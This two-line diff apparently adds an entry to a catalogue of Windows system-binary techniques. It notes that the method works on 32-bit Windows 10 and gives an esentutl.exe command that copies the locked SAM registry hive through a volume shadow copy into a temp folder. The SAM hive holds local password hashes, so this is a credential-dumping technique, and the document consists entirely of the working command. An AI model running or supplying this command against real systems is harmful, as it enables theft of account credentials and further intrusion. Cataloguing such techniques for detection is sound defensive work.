@@ -1,0 +1,2 @@
+Working on 32bit win10
+esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
